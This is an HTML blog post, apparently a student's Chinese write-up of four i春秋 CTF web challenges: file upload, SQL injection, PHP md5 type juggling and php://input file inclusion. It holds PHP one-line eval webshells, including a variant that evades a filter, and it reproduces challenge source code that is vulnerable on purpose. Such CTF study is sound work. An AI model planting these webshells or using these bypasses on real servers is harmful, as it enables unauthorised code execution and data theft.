@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>i春秋做题记录 web(一) | 未完成的歌</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="前言：时间过的真快呀，一转眼半学期就过去了(￣m￣）；攻防世界上的题差不多刷完了(剩下的都是不会的T_T)，这周就来做做 i春秋的题，顺便记录下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋做题记录 web(一)">
+<meta property="og:url" content="https://github.com/wwcdg/wwcdg.github.io/2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/index.html">
+<meta property="og:site_name" content="未完成的歌">
+<meta property="og:description" content="前言：时间过的真快呀，一转眼半学期就过去了(￣m￣）；攻防世界上的题差不多刷完了(剩下的都是不会的T_T)，这周就来做做 i春秋的题，顺便记录下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191030162630590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103172707128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191030162853663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103162535997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/2019110316284923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103163918156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103164216508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103164928944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103165117879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191030195146808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191103170830809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191030175352961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191031202054697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191031203305913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191031205339435.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191031205614164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191031212358170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191031201323703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2019-11-03T09:28:45.000Z">
+<meta property="article:modified_time" content="2021-01-20T08:35:33.744Z">
+<meta property="article:author" content="未完成的歌">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img-blog.csdnimg.cn/20191030162630590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">
+  
+    <link rel="alternate" href="/atom.xml" title="未完成的歌" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">未完成的歌</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://github.com/wwcdg/wwcdg.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-i春秋做题记录 web(一)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/" class="article-date">
+  <time class="dt-published" datetime="2019-11-03T09:28:45.000Z" itemprop="datePublished">2019-11-03</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>►<a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Web/">Web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      i春秋做题记录 web(一)
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>前言：<br>时间过的真快呀，一转眼半学期就过去了(￣m￣）；攻防世界上的题差不多刷完了(剩下的都是不会的T_T)，这周就来做做 i春秋的题，顺便记录下。<hr></p>
+<a id="more"></a>
+<h3 id="1、想怎么传就怎么传，就是这么任性。"><a href="#1、想怎么传就怎么传，就是这么任性。" class="headerlink" title="1、想怎么传就怎么传，就是这么任性。"></a>1、想怎么传就怎么传，就是这么任性。</h3><p>题型：    Web Upload<br><img src="http://img-blog.csdnimg.cn/20191030162630590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题就是一个简单的文件上传题目；先用一个普通的php小马试一下：<code>&lt;?php @eval($_POST[&#39;smk&#39;]);?&gt;</code><br>然后发现文件是上传成功了，但是<code>&lt;? php</code>被过滤掉了<br>于是在网上找到另一个一句话，将php用大写绕过 修改后如下：<br><code>&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;smk&#39;])&lt;/script&gt;</code><br>然后连接菜刀就能看到flag了。<br><img src="http://img-blog.csdnimg.cn/20191103172707128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="2、出题人就告诉你这是个注入，有种别走！"><a href="#2、出题人就告诉你这是个注入，有种别走！" class="headerlink" title="2、出题人就告诉你这是个注入，有种别走！"></a>2、出题人就告诉你这是个注入，有种别走！</h3><p>题型：    Web Sql<br><img src="http://img-blog.csdnimg.cn/20191030162853663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目：<br><img src="http://img-blog.csdnimg.cn/20191103162535997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到题目的url就知道要对id注入。首先试一下order by，发现错误，可能是关键字过滤。试了试<code>/**/</code>还是不行，改用<code>&lt;&gt;</code>发现可以了，如图：<br><img src="http://img-blog.csdnimg.cn/2019110316284923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试得字段数为3，接下来就没啥好说的了，按顺序，爆库爆表爆字段<br><img src="http://img-blog.csdnimg.cn/20191103163918156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164216508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164928944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103165117879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p>
+<h3 id="3、这个真的是爆破。"><a href="#3、这个真的是爆破。" class="headerlink" title="3、这个真的是爆破。"></a>3、这个真的是爆破。</h3><p>题型：Misc    Web<br><img src="http://img-blog.csdnimg.cn/20191030195146808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，看到一段php语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);&#x2F;&#x2F; 关闭错误报告</span><br><span class="line">session_start();&#x2F;&#x2F;启动会话</span><br><span class="line">require(&#39;.&#x2F;flag.php&#39;);</span><br><span class="line">if(!isset($_SESSION[&#39;nums&#39;]))&#123;&#x2F;&#x2F;isset() — 检测变量是否设置。</span><br><span class="line">  $_SESSION[&#39;nums&#39;] &#x3D; 0;</span><br><span class="line">  $_SESSION[&#39;time&#39;] &#x3D; time();&#x2F;&#x2F;返回当前时间的 Unix 时间戳</span><br><span class="line">  $_SESSION[&#39;whoami&#39;] &#x3D; &#39;ea&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&#39;time&#39;]+120&lt;time())&#123;</span><br><span class="line">  session_destroy();&#x2F;&#x2F;session_destroy — 销毁一个会话中的全部数据</span><br><span class="line">&#125;&#x2F;&#x2F;120s后会话结束</span><br><span class="line"></span><br><span class="line">$value &#x3D; $_REQUEST[&#39;value&#39;];</span><br><span class="line">$str_rand &#x3D; range(&#39;a&#39;, &#39;z&#39;);&#x2F;&#x2F;range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组</span><br><span class="line">$str_rands &#x3D; $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];&#x2F;&#x2F;mt_rand() 使用 Mersenne Twister 算法返回0到25之间的随机整数。$str_rand[mt_rand(0,25)]返回&quot;a&quot; 到 &quot;z&quot;之间任意字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]是两任意字母相连</span><br><span class="line"></span><br><span class="line">if($_SESSION[&#39;whoami&#39;]&#x3D;&#x3D;($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)&#x3D;&#x3D;0)&#123;&#x2F;&#x2F;substr(string,start,length)。&#x3D;&#x3D;&#x3D;是包括变量值与类型完全相等。&#x3D;&#x3D;只是比较两个数的值是否相等，由于substr是字符串，和数字比较的时候会强制转化成数字0，自然和0相等。</span><br><span class="line">  $_SESSION[&#39;nums&#39;]++;</span><br><span class="line">  $_SESSION[&#39;whoami&#39;] &#x3D; $str_rands;</span><br><span class="line">  echo $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&#39;nums&#39;]&gt;&#x3D;10)&#123;&#x2F;&#x2F;循环10次输出flag，暴力破解</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>因为md5不能对数组进行处理，MD5()计算数组会返回null，里面的判断是用==所以我们用数组传值那么<code>substr(md5($value),5,4)==0</code>这个条件恒成立。<br>因为我刚访问由于这段代码<code>$_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;</code> 我们要先传入<code>?value[]=ea</code> </p>
+<p>那么nums就会自增，<code>$_SEESION[&#39;whoami&#39;] = 随机2个字母</code> </p>
+<p>并同时输出到页面上，我们再根据输出的字符修改<code>$value[0].$value[1]</code>的值即可，只要操作大于等于10次，就可以出flag 。<br><img src="http://img-blog.csdnimg.cn/20191103170830809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>综上所述循环10次后输出flag：<br><img src="http://img-blog.csdnimg.cn/20191030175352961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="4、没错！就是文件包含漏洞"><a href="#4、没错！就是文件包含漏洞" class="headerlink" title="4、没错！就是文件包含漏洞"></a>4、没错！就是文件包含漏洞</h3><p>题型：Web Upload<br>知识点：<br>1、当php开启allow_url_include的时候，可以用php://input伪协议包含文件<br>2、php中的system命令执行函数<br><img src="http://img-blog.csdnimg.cn/20191031202054697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这题也挺简单，利用了<strong>php伪协议</strong> ：</p>
+<ol>
+<li>php://input<br>构造场景：本地web服务器根目录下有文件<code>phpinput_server.php</code>，代码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	 $a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">	 $raw_post_data &#x3D; file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;&#39;php:&#x2F;&#x2F;input&#39;</span><br><span class="line">	 echo $raw_post_data;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+在浏览器中按照如下方式访问：<br>地址栏输入的是：<code>http://localhost/phpinput_server.php?a=php://input</code><br>post框直接输入一段数据<br>Excute后，脚本会在页面中输出这段数据。<br><img src="http://img-blog.csdnimg.cn/20191031203305913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总结：此种方式可以用来获取post数据，但不能获取get数据。</li>
+</ol>
+<p>既然题目是文件包含，我们来看下关键性函数的状态<br>allow_url_include<br><img src="http://img-blog.csdnimg.cn/20191031205339435.png" alt="在这里插入图片描述"><br>当<code>allow_url_include</code>为On而<code>allow_url_fopen</code>为Off的时候，我们可以用用<strong>php://input</strong>伪协议进行包含<br><img src="https://img-blog.csdnimg.cn/20191031205614164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到目录下有三个文件，flag是在第一个文件里<br>查看dle345aae.php：<br><img src="http://img-blog.csdnimg.cn/20191031212358170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">右键查看源码：得到flag<br><img src="http://img-blog.csdnimg.cn/20191031201323703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://github.com/wwcdg/wwcdg.github.io/2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/" data-id="ckk5lg64s001ges7maosqbdj5" data-title="i春秋做题记录 web(一)" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/12/05/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          Python学习笔记（一）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">攻防世界 Web进阶(一)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Blog%E6%90%AD%E5%BB%BA/">Blog搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/">Web开发</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/JavaEE/">JavaEE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/">前端</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/MISC/">MISC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Web/">Web</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%86%E6%9E%90/">密码学分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/Sql%E6%B3%A8%E5%85%A5/">Sql注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">线下赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%B2%B2%E9%B9%8FHCIA/">鲲鹏HCIA</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HCIA/" rel="tag">HCIA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LSB/" rel="tag">LSB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mybatis/" rel="tag">Mybatis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpringMVC/" rel="tag">SpringMVC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crc%E7%A2%B0%E6%92%9E/" rel="tag">crc碰撞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/" rel="tag">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/html/" rel="tag">html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">上传漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" rel="tag">伪加密</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%B2%E6%B0%B4%E5%8D%B0/" rel="tag">盲水印</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%90%E5%86%99/" rel="tag">隐写</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Crypto/" style="font-size: 15px;">Crypto</a> <a href="/tags/HCIA/" style="font-size: 10px;">HCIA</a> <a href="/tags/LSB/" style="font-size: 10px;">LSB</a> <a href="/tags/Mybatis/" style="font-size: 10px;">Mybatis</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/SpringMVC/" style="font-size: 10px;">SpringMVC</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/crc%E7%A2%B0%E6%92%9E/" style="font-size: 10px;">crc碰撞</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/css/" style="font-size: 10px;">css</a> <a href="/tags/html/" style="font-size: 10px;">html</a> <a href="/tags/misc/" style="font-size: 15px;">misc</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" 